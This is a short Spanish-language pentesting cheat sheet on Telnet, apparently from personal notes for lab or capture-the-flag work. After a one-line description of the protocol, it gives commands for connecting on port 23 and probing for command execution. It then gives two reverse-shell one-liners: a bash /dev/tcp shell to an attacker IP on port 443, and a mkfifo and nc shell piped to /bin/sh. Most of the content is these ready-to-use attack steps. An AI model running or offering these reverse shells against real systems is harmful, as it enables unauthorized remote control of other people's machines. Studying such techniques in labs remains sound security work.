# Telnet 

Tags: #Telnet #Puerto #Comandos 

Telnet es el nombre de un protocolo de red que nos permite acceder a otra máquina para manejarla remotamente como si estuviéramos sentados delante de ella. También es el nombre del programa informático que implementa el cliente.

## Comandos

```bash 
❯ telnet ❮IP❯ 23             # Iniciar sesion en Telnet en su puerto por default 23

	❯ ?                     # Mirar el panel de ayuda, en ocasiones se encuentra ‘exec system commands’ 
     ❯ exec id               # Muestra el id
     ❯ exec ifconfig         # Muestra las interfaces y su ip address
     ❯ exec bash -c “bash -i >& /dev/tcp/10.10.14.2/443 0>&1”     # Si se puede ejecutar comandos, se puede hacer una ReverShell de esta manera colocando la IP del atacante y su puerto

	❯ .HELP                 # Mostrar los comandos a ejecutar 
	❯ .RUN ping IP -c 1     # Hacer ping
	❯ .RUN mkfifo /tmp/msnht; nc IP 443 0</tmp/msnht | /bin/sh >/tmp/msnht 2>&1; rm /tmp/msnht   # Revershell
```